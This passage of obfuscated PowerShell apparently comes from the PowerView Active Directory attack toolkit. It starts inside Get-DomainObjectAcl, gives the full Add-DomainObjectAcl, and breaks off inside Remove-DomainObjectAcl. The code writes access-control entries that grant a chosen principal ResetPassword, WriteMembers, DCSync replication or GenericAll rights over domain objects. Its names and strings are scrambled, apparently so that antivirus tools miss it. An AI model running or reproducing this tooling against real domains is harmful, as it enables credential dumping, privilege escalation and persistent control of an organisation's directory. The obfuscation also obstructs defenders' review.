                            ${OBjE`Ct}[${A}] = ${_}."aTTr`IbU`TES"[${A}]
                        }
                        else {
                            ${VaL`U`ES} = @()
                            foreach (${V} in ${_}."A`TtRibU`TES"[${a}]."Ge`Tval`UEs"([byte[]])) {
                                ${v`ALUes} +=   (  GcI  ("{0}{2}{1}"-f'VaRI','Lc','aBLe:M1')  )."v`AlUe"::"U`Tf8"."ge`TsT`RinG"(${v})
                            }
                            ${OB`J`ect}[${A}] = ${v`ALuEs}
                        }
                    }
                }
                else {
                    ${obJ`ECt} = ${_}."p`ROpE`RTIEs"
                }


                if (${obJ`EcT}."O`BJECTS`id" -and ${o`BJEcT}."oB`J`EctS`id"[0]) {
                    ${Obje`c`TSID} = (&("{1}{0}{2}"-f 'bj','New-O','ect') ("{9}{6}{8}{3}{2}{11}{4}{12}{0}{7}{10}{1}{5}" -f 'ent','e','y.','urit','cu','r','s','i','tem.Sec','Sy','fi','Principal.Se','rityId')(${O`BJ`ECt}."oB`JEc`TSid"[0],0))."VAL`Ue"
                }
                else {
                    ${ob`JE`cTSID} = ${N`ULL}
                }

                try {
                    ${secuRITy`DE`S`cR`I`ptoR} = &("{0}{2}{1}"-f'N','Object','ew-') ("{1}{4}{2}{0}{6}{10}{7}{5}{8}{3}{11}{9}"-f '.Acce','Sec','ity','scr','ur','a','ssCon','.R','wSecurityDe','r','trol','ipto') -ArgumentList ${OB`JE`Ct}[("{1}{3}{2}{0}{4}"-f'descri','nts','y','ecurit','ptor')][0], 0
                    ${SEC`U`RIty`Des`cr`ipToR} | &("{0}{1}{2}{3}" -f'F','orEach-Obje','c','t') { if (${PsBO`UND`p`ARam`etERS}[("{0}{1}" -f 'S','acl')]) {${_}."sY`stEMa`cL"} else {${_}."D`I`sCrET`IoN`ArY`Acl"} } | &("{4}{0}{1}{2}{3}"-f'r','E','ach-Obje','ct','Fo') {
                        ${cONti`N`UE} = ${Fa`LSe}
                        ${_} | &("{0}{1}{2}"-f'Add-','Membe','r') ("{0}{2}{3}{1}" -f'Note','perty','Pr','o') ("{1}{0}{2}" -f'je','Ob','ctDN') ${ob`je`Ct}."dist`i`NgU`IsHEDN`AME"[0]
                        ${_} | &("{1}{0}{2}"-f '-Membe','Add','r') ("{0}{2}{1}" -f'Not','ty','eProper') ("{1}{2}{0}{3}" -f 'ctS','O','bje','ID') ${ObjeCt`s`ID}
                        ${_} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{1}{2}{0}"-f 'rty','NotePr','ope') ("{3}{0}{1}{4}{2}"-f'recto','r','Rights','ActiveDi','y') ( (  vARIABLe  ("{0}{1}"-f'G','604') )."Va`lUe"::"TO`Ob`Ject"([System.DirectoryServices.ActiveDirectoryRights], ${_}."ACc`Essm`AsK"))
                        if (${psBoU`N`Dp`A`RaMET`eRS}[("{1}{2}{0}" -f'ter','RightsFi','l')]) {
                            ${g`UIDf`ilt`er} = Switch (${r`i`GhtSfiLTer}) {
                                ("{0}{1}{2}"-f 'R','esetPass','word') { @(("{4}{0}{6}{1}{5}{3}{2}" -f'2','11d0-a768','9','00aa006e052','00299570-','-','46d-')) }
                                ("{1}{0}{2}" -f'riteM','W','embers') { @(("{1}{8}{9}{3}{4}{7}{2}{5}{6}{10}{0}"-f'2','bf96','a285','-','0d','-00a','a00','e6-11d0-','79','c0','3049e')) }
                                ("{1}{0}" -f'nc','DCSy') { @(("{2}{3}{5}{1}{6}{4}{0}"-f '2','11d','1131f6aa-','9','f79f-00c04fc2dcd','c07-','1-'), ("{2}{0}{1}{5}{3}{4}"-f '-9c07','-11d1-f','1131f6ad','9f-00c04fc','2dcd2','7'), ("{2}{1}{3}{0}"-f'll','e','G','nericA'), ("{4}{0}{1}{3}{2}" -f'nd','e','t','dRigh','Exte')) }
                                ("{2}{0}{3}{1}" -f 'Exten','d','All','de') { ("{1}{3}{0}{2}"-f 'igh','E','t','xtendedR') }
                                ("{2}{1}{0}" -f'S','AP','ReadL') { @(("{4}{2}{1}{3}{0}"-f 'ht','de','ten','dRig','Ex'), ("{1}{0}{2}" -f 'ic','Gener','All'), ("{0}{2}{1}{3}" -f'Wr','Da','ite','cl')) }
                                'All' { ("{2}{1}{0}"-f'All','neric','Ge') }
                                Default { ("{4}{3}{2}{1}{8}{7}{0}{6}{5}"-f '0000','0','00-000','0','00000000-0','0','0','0','-0000-00000') }
                            }
                            if (${_}."AcEQuAl`IfI`eR" -eq ("{1}{3}{2}{0}" -f'lowed','Acce','sAl','s') -and ((${_}."OB`JECta`c`eTYPe" -and ${g`UIdfiL`Ter} -contains ${_}."O`BjecTAcE`T`ypE") -or (${_}."i`N`her`ITeDoBJecTaCetYPe" -and ${GuiDF`ilT`eR} -contains ${_}."in`H`er`itedo`BjECTACetype"))) {
                                ${Con`T`InUe} = ${tr`Ue}
                            }
                            elseif (${_}."acEQu`ALif`I`ER" -eq ("{0}{1}{2}"-f'Ac','cessAll','owed') -and !(${_}."obje`CTA`C`eTy`pE") -and !(${_}."Inh`eriTEdO`Bj`EC`T`Ac`EtYPE") -and ((${_}."aC`Ti`VEdirECTo`RyRIGh`Ts" -match ${G`UID`F`iLTer}) -or (${G`UidFi`l`TeR} -contains ${_}."aC`T`iVEdiRe`cTOR`yri`g`hTS"))) {
                                ${C`ont`InUE} = ${t`RUe}
                            }
                            elseif ((${_}."ACEq`UaL`I`FIER" -eq ("{0}{1}{2}" -f 'Acces','s','Allowed')) -and !(${_}."ObJ`eCT`Ace`TyPE") -and !(${_}."INh`eriTedoBJ`E`cTaCeT`y`pe")) {
                                ForEach (${G`Uid} in ${GuID`FI`L`TER}) {
                                    if (${_}."AC`T`IveDIRect`ORYrI`ghTS" -match ${G`UId}) {
                                        ${CONT`IN`Ue} = ${tR`UE}
                                    }
                                }
                            }
                        }
                        else {
                            ${C`OnTin`UE} = ${TR`Ue}
                        }
                        if (${C`ONTinue}) {
                            if (${Gu`Ids}) {
                                
                                ${Acl`pROpeRT`IeS} = @{}
                                ${_}."P`sO`BJECt"."p`ROpe`RTIeS" | &("{3}{2}{4}{1}{0}"-f 't','jec','orE','F','ach-Ob') {
                                    if (${_}."NA`mE" -match ((("{13}{0}{12}{7}{14}{5}{10}{4}{6}{3}{8}{1}{2}{11}{9}"-f'e','I','nheritedObject','pe7','e','ctType7','ctAceTy','dOb','Is','Type','IsObj','Ace','ctType7IsInherite','Obj','je'))  -REplAce  ([chaR]55+[chaR]73+[chaR]115),[chaR]124)) {
                                        try {
                                            ${a`c`LPRoP`ertIES}[${_}."N`AME"] = ${gU`I`dS}[${_}."Va`lue".("{0}{1}" -f 'toStr','ing').Invoke()]
                                        }
                                        catch {
                                            ${AcL`Prope`Rti`Es}[${_}."N`AmE"] = ${_}."v`AlUe"
                                        }
                                    }
                                    else {
                                        ${acl`PRO`PER`T`iEs}[${_}."na`ME"] = ${_}."va`Lue"
                                    }
                                }
                                ${OU`Tob`Ject} = &("{3}{1}{2}{0}" -f 'ct','w-Obj','e','Ne') -TypeName ("{0}{1}{2}"-f'P','SO','bject') -Property ${AClP`ROpE`RTi`Es}
                                ${out`oBJ`ECt}."psoBJ`E`cT"."T`YPen`Am`Es".("{1}{0}"-f'nsert','I').Invoke(0, ("{1}{0}{3}{2}" -f'werVi','Po','CL','ew.A'))
                                ${oUt`OB`Je`CT}
                            }
                            else {
                                ${_}."Ps`obJ`EcT"."tY`pENA`mES".("{0}{1}" -f 'I','nsert').Invoke(0, ("{2}{0}{3}{1}"-f 'erView.','L','Pow','AC'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{1}{0}{2}"-f'erbos','Write-V','e') ('[G'+'et-Domain'+'Obj'+'ec'+'t'+'Acl'+'] '+'E'+'rror: '+"$_")
                }
            }
        }
    }
}


function aD`d-`DoMaINOBJ`E`CTaCL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{3}{0}{2}" -f 'oces','dP','s','r','PSShoul'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOsITIon = 0, VaLuEfrompIPELiNe = ${tr`Ue}, VALUeFrOmPipEliNEbYProPErTyNAMe = ${T`RuE})]
        [Alias({"{2}{3}{4}{0}{1}" -f 'hedN','ame','Disti','n','guis'}, {"{0}{2}{3}{1}"-f'Sam','me','Ac','countNa'}, {"{1}{0}" -f 'ame','N'})]
        [String[]]
        ${Ta`RGETidEn`T`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${tarG`ET`d`O`MAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        ${tar`getLdApFI`l`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${t`ARGET`seArchb`ASE},

        [Parameter(MANDatOrY = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`INc`Ip`AlIdEntity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prInci`pA`Ld`o`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}"-f'inContr','Doma','er','oll'})]
        [String]
        ${SeR`VeR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{2}{0}"-f'l','O','neLeve'}, {"{0}{1}"-f'Subt','ree'})]
        [String]
        ${sEa`R`cHsc`Ope} = ("{2}{1}{0}" -f 'ree','bt','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUlTpAg`esi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVertIm`e`L`ImiT},

        [Switch]
        ${TO`M`BST`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eD`EnTIAL} =   (GET-VariabLE  ('7Tq'+'02') )."V`ALUE"::"EMP`TY",

        [ValidateSet('All', {"{2}{0}{3}{1}" -f 's','ord','Re','etPassw'}, {"{1}{0}{2}{3}" -f'ite','Wr','Member','s'}, {"{2}{0}{1}"-f'CSy','nc','D'}, {"{3}{1}{0}{2}"-f'xtende','E','d','All'})]
        [String]
        ${R`IG`hTS} = 'All',

        [Guid]
        ${rIGh`TSG`U`id}
    )

    BEGIN {
        ${Tar`GeTseARC`herA`RGu`Ments} = @{
            ("{1}{2}{0}"-f 'es','Prope','rti') = ("{0}{2}{3}{1}" -f'dis','shedname','tingu','i')
            'Raw' = ${tr`UE}
        }
        if (${pS`Bo`UnDPARAm`EtE`Rs}[("{2}{0}{1}"-f'rgetDom','ain','Ta')]) { ${TArGETseARC`h`E`RaRGUMEN`Ts}[("{0}{1}" -f'D','omain')] = ${tARge`TDOm`AIn} }
        if (${PSB`O`U`Ndp`ArAmETeRs}[("{1}{5}{0}{2}{3}{4}"-f'e','Tar','tLDAPF','il','ter','g')]) { ${t`ARGETSE`ARch`E`RaRGUME`NtS}[("{1}{2}{0}" -f 'ter','LD','APFil')] = ${TAR`GEt`LdaPfIL`TEr} }
        if (${psbO`U`NDpARA`Me`Ters}[("{2}{1}{0}{3}{4}" -f 'r','a','TargetSe','c','hBase')]) { ${tARgEtSEar`cHE`RA`Rg`Ume`N`TS}[("{2}{1}{0}" -f 'e','hBas','Searc')] = ${tARG`et`SE`A`RChbaSE} }
        if (${P`sB`o`UndParAm`ETErs}[("{1}{0}"-f 'ver','Ser')]) { ${taRG`etS`eARCHeRarGUMe`N`Ts}[("{1}{0}{2}"-f'erv','S','er')] = ${S`Erver} }
        if (${PsBo`U`NdpAR`AMETE`Rs}[("{2}{0}{1}"-f'hS','cope','Searc')]) { ${targ`etSe`A`RChE`RarG`UMEn`Ts}[("{0}{2}{1}"-f'Se','Scope','arch')] = ${s`earCh`S`COPe} }
        if (${P`sB`Ou`NDpA`Ra`mEters}[("{0}{2}{1}"-f 'Re','Size','sultPage')]) { ${t`Ar`gETsearC`Hera`RguMentS}[("{1}{2}{0}{3}" -f'g','Resu','ltPa','eSize')] = ${Re`SUl`TpAG`Es`ize} }
        if (${psbOu`N`DP`ArameTeRs}[("{0}{1}{3}{2}"-f'S','erv','imeLimit','erT')]) { ${tA`R`ge`TseArCheRa`RGUmEnts}[("{3}{4}{2}{1}{0}" -f 't','i','m','ServerTim','eLi')] = ${s`ErvE`Rti`MeLImit} }
        if (${pS`BOUnDpA`Ra`METErs}[("{2}{0}{1}" -f 'mbst','one','To')]) { ${t`ARgE`TSe`ArchER`ARGumENtS}[("{2}{0}{1}" -f 'ston','e','Tomb')] = ${tO`mB`StOne} }
        if (${PSBO`U`NDpa`RamEt`e`Rs}[("{1}{0}{2}"-f 'edenti','Cr','al')]) { ${T`A`RGETSeaR`cHeRaRg`UmeNtS}[("{1}{2}{0}" -f'edential','C','r')] = ${credE`N`T`iAl} }

        ${PRiNCiPAL`SE`A`RChEraRG`U`mENTs} = @{
            ("{0}{2}{1}" -f 'I','ty','denti') = ${pr`inciP`ALidEn`TITy}
            ("{1}{0}{2}"-f'e','Prop','rties') = ("{2}{3}{4}{0}{1}"-f 'ishe','dname,objectsid','dis','ting','u')
        }
        if (${p`SB`oUn`dpARameT`ERs}[("{3}{2}{1}{0}{4}"-f'alDom','cip','in','Pr','ain')]) { ${pRINC`IpaLsear`cHE`R`Argume`N`TS}[("{0}{1}" -f 'D','omain')] = ${P`Ri`NcipalDO`ma`In} }
        if (${Ps`Boun`dPaRam`et`ERS}[("{1}{0}"-f'ver','Ser')]) { ${PRINciP`ALsEarC`HErAR`gUm`Ents}[("{0}{1}"-f'Se','rver')] = ${sEr`VEr} }
        if (${psBoU`NDp`ArAMet`E`RS}[("{0}{1}{2}" -f 'S','earchScop','e')]) { ${PRin`CIpalS`ea`RcHe`Rargum`EnTS}[("{0}{3}{1}{2}"-f'Sea','o','pe','rchSc')] = ${se`ARC`HScO`pe} }
        if (${p`sb`oundpARa`MEtE`RS}[("{2}{0}{1}{3}"-f'esu','ltPage','R','Size')]) { ${prINciP`AL`sE`A`RCheRa`RgU`M`Ents}[("{2}{0}{3}{1}{4}" -f's','Pa','Re','ult','geSize')] = ${Re`Su`LTp`A`gESIzE} }
        if (${psBou`N`D`PArAMETErS}[("{2}{1}{0}{3}" -f'rTimeLimi','erve','S','t')]) { ${p`RiNCIPaLSE`A`R`cherarGU`MEN`TS}[("{0}{4}{1}{2}{3}" -f'Server','i','m','it','TimeL')] = ${Serve`Rt`iME`lImIt} }
        if (${P`SbouN`dpA`RAM`ETerS}[("{2}{1}{0}" -f 'stone','omb','T')]) { ${PRiNCipA`lseArcHeRAR`g`UM`E`N`Ts}[("{1}{2}{0}" -f 'tone','Tomb','s')] = ${TOm`Bs`TOnE} }
        if (${PS`B`Oundp`A`R`AmetErs}[("{1}{2}{0}" -f 'al','Creden','ti')]) { ${P`R`INCi`PalSe`A`RCHErA`R`gUMENTS}[("{1}{0}{2}" -f'rede','C','ntial')] = ${cREdE`NT`iaL} }
        ${P`R`INCi`Pals} = &("{0}{1}{2}"-f'Get-DomainO','b','ject') @PrincipalSearcherArguments
        if (-not ${PR`INC`i`paLs}) {
            throw ('Una'+'ble'+' '+'t'+'o '+'resolv'+'e '+'princi'+'p'+'a'+'l: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${t`A`RgEt`sE`ARcheRaRGumE`NTS}[("{2}{0}{1}"-f 'ent','ity','Id')] = ${tar`gE`Tid`Entity}
        ${tARge`TS} = &("{4}{1}{3}{0}{2}" -f 'a','-D','inObject','om','Get') @TargetSearcherArguments

        ForEach (${t`ArG`eToBj`eCT} in ${T`ArGE`Ts}) {

            ${iN`h`ER`iTAnC`e`TyPE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f'N','one')
            ${con`T`RoLT`YPE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f 'w','Allo')
            ${aC`es} = @()

            if (${R`iGH`Ts`gUid}) {
                ${Gu`idS} = @(${riGhtSg`U`Id})
            }
            else {
                ${g`Uids} = Switch (${R`i`GHTs}) {
                    
                    ("{1}{2}{4}{0}{3}"-f'r','Res','e','d','tPasswo') { ("{8}{10}{7}{0}{4}{1}{6}{3}{2}{9}{5}" -f '6d-1','d0-a768-00','0','a','1','29','a','24','002','06e05','99570-') }
                    
                    ("{1}{0}{2}"-f'ri','W','teMembers') { ("{1}{0}{3}{6}{2}{5}{4}"-f '11d0-a','bf9679c0-0de6-','3','285-00','9e2','04','aa00') }
                    
                    
                    
                    
                    ("{2}{0}{1}" -f 'CSy','nc','D') { ("{7}{3}{2}{5}{6}{4}{1}{0}"-f'2dcd2','00c04fc','f6','31','-f79f-','aa-9','c07-11d1','11'), ("{5}{6}{1}{8}{4}{3}{2}{7}{0}" -f 'fc2dcd2','ad','00c0','7-11d1-f79f-','c0','1','131f6','4','-9'), ("{2}{5}{9}{6}{4}{7}{3}{8}{0}{1}" -f '40','c','8','62-99','d-','9e9','44','4c','1a-0facbeda6','5b76-4')}
                    ("{2}{1}{0}{3}"-f 'te','llEx','A','nded') { ("{2}{0}{3}{1}{4}" -f'ten','ig','Ex','dedR','ht') }
                }
            }

            ForEach (${PRI`Nc`IPA`L`OB`JEcT} in ${PR`InCIp`ALS}) {
                &("{3}{2}{0}{1}"-f 'os','e','te-Verb','Wri') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${IDe`NT`ity} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pR`iN`cIpaL`obJe`ct}."OB`j`EcTSID")

                    if (${g`Ui`DS} -and !(${gU`IdS} -eq ("{2}{1}{0}" -f 'tendedRight','x','E'))) {
                        ForEach (${G`Uid} in ${gU`i`dS}) {
                            ${ne`WGUid} = &("{1}{2}{3}{0}"-f'ect','New-','O','bj') ("{0}{1}" -f 'G','uid') ${gU`id}
                            ${ADR`iGH`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{2}{0}{3}" -f 'igh','Exte','ndedR','t')
                            ${ac`es} += &("{0}{2}{1}"-f 'N','Object','ew-') ("{1}{10}{6}{8}{2}{11}{5}{3}{4}{9}{0}{7}" -f 'ul','System.Di','ti','ctory','A','Dire','ctoryServices.','e','Ac','ccessR','re','ve') ${idE`N`TItY}, ${a`Dr`iGHTS}, ${cont`R`olTY`pe}, ${nEW`GUId}, ${InHErI`Tan`CeT`y`pe}
                        }
                    }
                    elseif (${g`UIdS} -eq ("{0}{1}{2}{3}" -f 'E','xten','dedRi','ght')) {
                        ${a`D`RIghtS} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}" -f'dedRight','ten','Ex')
                        ${A`CES} += &("{3}{0}{2}{1}"-f'-Ob','t','jec','New') ("{12}{8}{1}{11}{3}{4}{6}{7}{9}{2}{10}{0}{5}" -f'ce','ct','eDir','ySe','r','ssRule','vic','es.A','stem.Dire','ctiv','ectoryAc','or','Sy') ${i`deNT`Ity}, ${a`Drig`htS}, ${CoNTr`OL`TY`pe}, ${i`NhERi`Tan`ce`TYPe}
                    }
                    else {
                        
                        ${a`DRi`G`HTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}{3}"-f 'l','A','Generic','l')
                        ${ac`ES} += &("{1}{0}{2}"-f '-','New','Object') ("{5}{0}{6}{1}{8}{2}{3}{10}{9}{4}{7}"-f'ystem','oryS','tive','Direct','ssR','S','.Direct','ule','ervices.Ac','yAcce','or') ${i`De`NtITy}, ${A`dRIg`hTS}, ${C`onTRol`TYpE}, ${iNh`E`RitanCEtyPE}
                    }

                    
                    ForEach (${a`Ce} in ${a`CES}) {
                        &("{2}{1}{3}{0}" -f'se','-','Write','Verbo') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${targ`E`T`ENtRy} = ${t`Ar`GETo`BjecT}.("{4}{2}{3}{0}{1}" -f'toryEn','try','ir','ec','GetD').Invoke()
                        ${tARGete`N`TrY}."PS`BaSE"."OptI`Ons"."SECu`R`itYma`sks" = ("{0}{1}"-f'Dac','l')
                        ${T`A`RgeTENT`RY}."PSb`AsE"."O`BjECT`SecUr`iTY".("{0}{1}{2}" -f'Add','Acce','ssRule').Invoke(${a`cE})
                        ${T`Ar`G`EtENtRy}."P`sbase".("{1}{0}{2}{3}" -f 'ommi','C','tCha','nges').Invoke()
                    }
                }
                catch {
                    &("{2}{0}{1}{3}"-f'ri','te','W','-Verbose') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function RE`mOVe-D`O`M`AinobJ`ec`TACL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{1}{3}"-f'ho','ces','PSS','s','uldPro'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(poSITion = 0, VaLUefROMPipeLiNe = ${T`RuE}, vaLUEFrOMPiPELINEBYPROpERtYnAmE = ${Tr`UE})]
        [Alias({"{2}{1}{3}{0}" -f'edName','is','Distingu','h'}, {"{2}{3}{1}{0}" -f 'ountName','cc','Sam','A'}, {"{1}{0}" -f 'me','Na'})]
        [String[]]
        ${tARgeTiDE`NT`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`Arge`TDo`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filte','r'})]
        [String]
        ${TAr`GEtLdApfi`l`T`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Tar`gEt`s`EArc`hBA`se},

        [Parameter(maNDatoRy = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`incipAli`D`EnT`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${pr`i`NCip`A`LDOMAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{3}{0}{1}" -f 'nt','roller','Domai','o','nC'})]
        [String]
        ${s`e`Rver},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{2}{0}{1}"-f 'eL','evel','On'}, {"{2}{0}{1}"-f 'tr','ee','Sub'})]
        [String]
        ${seA`RcHS`CoPe} = ("{0}{1}" -f 'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsu`LTPAG`eS`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERv`E`RtImelI`M`iT},

        [Switch]
        ${tO`M`BStOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`dE`NtiAL} =  ${7`Tq02}::"EMP`Ty",

        [ValidateSet('All', {"{0}{2}{4}{1}{3}"-f'ResetP','or','ass','d','w'}, {"{3}{0}{1}{2}" -f 'iteM','ember','s','Wr'}, {"{1}{0}"-f 'CSync','D'})]
        [String]
        ${R`Ig`hTS} = 'All',

        [Guid]
        ${rIgHtS`gU`iD}
    )

    BEGIN {
        ${tAR`GeTs`e`A`RChE`Rarg`UM`enTs} = @{
            ("{2}{1}{0}" -f 'ies','opert','Pr') = ("{3}{0}{2}{4}{1}"-f 'ui','dname','sh','disting','e')
            'Raw' = ${T`RuE}
        }
        if (${ps`BouNDPa`RameTe`Rs}[("{0}{1}{3}{2}"-f'Tar','getDo','ain','m')]) { ${TargetSearCH`E`R`ARgumen`Ts}[("{1}{0}{2}"-f'a','Dom','in')] = ${tar`ge`Td`OMA`iN} }
        if (${P`S`BO`UnDpa`R`AMETers}[("{4}{1}{0}{3}{2}" -f'P','A','ilter','F','TargetLD')]) { ${tARGetSeaR`CH`erar`g`U`ME`NTS}[("{1}{0}{2}"-f'Filte','LDAP','r')] = ${T`Ar`Ge`TLdApfilTEr} }
        if (${PsboUnd`Param`ET`ErS}[("{2}{1}{3}{0}" -f'se','rgetSea','Ta','rchBa')]) { ${TArGEtS`EArch`E`RA`R`gu`mENTs}[("{0}{3}{1}{2}" -f 'Sea','as','e','rchB')] = ${targeTS`e`ARC`hB`A`sE} }
        if (${Psbo`UnDp`ARA`m`eTERs}[("{0}{1}" -f 'Serve','r')]) { ${tAr`ge`TSEarch`erAr`GuME`NTs}[("{0}{1}" -f'Se','rver')] = ${s`E`RVER} }
        if (${PS`Bou`NdpaR`A`mEtErs}[("{3}{2}{0}{1}"-f'p','e','chSco','Sear')]) { ${ta`RGe`TS`eARche`RaRG`U`MENTS}[("{3}{0}{1}{2}"-f'chSc','o','pe','Sear')] = ${SEARc`h`SCO`pE} }
        if (${pSB`OU`Nd`parAMe`TerS}[("{0}{2}{1}{3}" -f'Resul','ageS','tP','ize')]) { ${tAR`ge`TS`eARcHera`RGuME`N`Ts}[("{3}{0}{2}{4}{1}" -f 'es','eSize','u','R','ltPag')] = ${rE`S`UlTpAges`iZE} }
        if (${psboun`D`pA`R`AmE`TeRS}[("{2}{0}{1}{3}"-f'ime','L','ServerT','imit')]) { ${T`A`RgeTSEaR`cHerARGUmE`NTs}[("{0}{3}{2}{4}{1}" -f'S','eLimit','rver','e','Tim')] = ${sE`RVerTiM`ELImIT} }
        if (${Psbou`Nd`paR`AMetERs}[("{0}{1}"-f'Tombst','one')]) { ${TA`R`G`eT`SeARCH`eRArGumenTs}[("{2}{0}{1}"-f'omb','stone','T')] = ${t`O`mBstOnE} }
        if (${PSB`oUnDP`ArA`Me`TeRS}[("{2}{1}{0}"-f 'al','enti','Cred')]) { ${taRGET`SE`AR`c`heRA`R`GuMEN`Ts}[("{0}{1}{2}"-f 'Creden','t','ial')] = ${c`REdENTI`AL} }

        ${p`Rin`CiPALS`Ear`CHErargUMENtS} = @{
            ("{0}{1}"-f'I','dentity') = ${p`RINCiP`AlIDe`N`TItY}
            ("{0}{1}{2}" -f'Proper','t','ies') = ("{5}{6}{4}{3}{0}{2}{1}"-f 'inguishe','objectsid','dname,','t','s','d','i')
        }
        if (${psB`oUN`D`paramETers}[("{2}{3}{1}{4}{0}" -f'in','cipa','P','rin','lDoma')]) { ${P`RiNc`I`PALSEARch`erA`RGUmE`NTs}[("{1}{0}" -f'ain','Dom')] = ${PrI`N`c`ipAldoM`AIN} }
        if (${P`SBOunD`paR`AMETErS}[("{1}{0}{2}" -f'erve','S','r')]) { ${pr`I`NCip`AL`seA`Rche`RaRGUMENtS}[("{0}{1}"-f'Se','rver')] = ${sE`R`VEr} }
        if (${Psbou`NdPaR`A`m`Eters}[("{2}{1}{0}" -f'ope','Sc','Search')]) { ${priNCIPAL`SEA`RcHE`R`ArGu`M`E`Nts}[("{0}{2}{1}" -f'SearchSc','e','op')] = ${sE`ARch`Scope} }
        if (${psbO`UnD`PARa`MetErS}[("{0}{2}{3}{1}" -f'ResultPa','ize','g','eS')]) { ${PRi`NcIpALSEArcHE`R`A`RGUm`ents}[("{1}{3}{2}{0}" -f 'ize','Resul','geS','tPa')] = ${RE`sU`LTPAg`EsizE} }
        if (${p`sb`OU`NdpaRa`MET`ERs}[("{3}{1}{4}{0}{2}" -f 'i','i','mit','ServerT','meL')]) { ${P`RincIPAL`se`ARcHErAR`GumEN`TS}[("{0}{3}{2}{4}{1}"-f'S','t','TimeL','erver','imi')] = ${S`eRVer`Ti`m`ELImIT} }
        if (${PS`BoUndPa`R`AM`e`TerS}[("{1}{2}{0}{3}" -f'st','T','omb','one')]) { ${PRiN`Cip`ALsE`A`RCheR`ARGUm`E`Nts}[("{0}{2}{1}" -f'Tomb','e','ston')] = ${t`Om`BsTONe} }
        if (${Psb`O`Un`DpAramE`TERS}[("{0}{1}{2}" -f'Cred','e','ntial')]) { ${pRInci`P`A`LSEaRcH`ERaRGU`meNTs}[("{2}{1}{0}"-f 'ial','nt','Crede')] = ${C`REdEnT`iaL} }
        ${pRIn`CipA`lS} = &("{3}{1}{2}{0}"-f't','et-Domain','Objec','G') @PrincipalSearcherArguments
        if (-not ${p`R`INcIPALs}) {
            throw ('Un'+'ab'+'le '+'t'+'o '+'re'+'sol'+'ve '+'p'+'r'+'incip'+'al: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${T`ARGEtSEa`RcHErAR`gU`m`EN`Ts}[("{2}{0}{1}" -f'ent','ity','Id')] = ${t`Arg`E`TIdENtITY}
        ${TA`RgE`TS} = &("{4}{0}{3}{1}{2}" -f 'e','-DomainObje','ct','t','G') @TargetSearcherArguments

        ForEach (${tA`RgETObj`e`CT} in ${targE`Ts}) {

            ${I`Nh`er`ITAnCET`ype} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}" -f 'Non','e')
            ${coNtR`oL`T`YpE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f 'ow','All')
            ${a`ces} = @()

            if (${RigHt`s`gu`id}) {
                ${Gu`IdS} = @(${r`ight`SGU`ID})
            }
            else {
                ${GUi`dS} = Switch (${Ri`gH`TS}) {
                    
                    ("{2}{0}{3}{1}"-f 'tPasswo','d','Rese','r') { ("{0}{1}{3}{6}{2}{4}{5}"-f '0029957','0-2','8-','46d-11d0-a','00aa00','6e0529','76') }
                    
                    ("{0}{3}{2}{1}"-f'Wr','s','eMember','it') { ("{8}{9}{6}{2}{5}{4}{1}{3}{0}{7}" -f'aa','85-0','0de6-11','0','0-a2','d','-','003049e2','bf9679c','0') }
                    
                    
                    
                    
                    ("{1}{0}"-f 'nc','DCSy') { ("{5}{1}{4}{3}{2}{0}{6}"-f'd','131f6aa-9','c2dc','1d1-f79f-00c04f','c07-1','1','2'), ("{8}{3}{0}{4}{1}{10}{6}{5}{9}{7}{2}" -f'd-9c07-','1d1','d2','31f6a','1','0','-0','c2dc','11','c04f','-f79f'), ("{4}{5}{3}{7}{1}{6}{2}{8}{0}{9}"-f'eda64','62','991a-','4d-','89e95b7','6-44','-','4c','0facb','0c')}
                }
            }

            ForEach (${pR`i`N`CipaLObJECt} in ${P`Ri`N`CIPAlS}) {
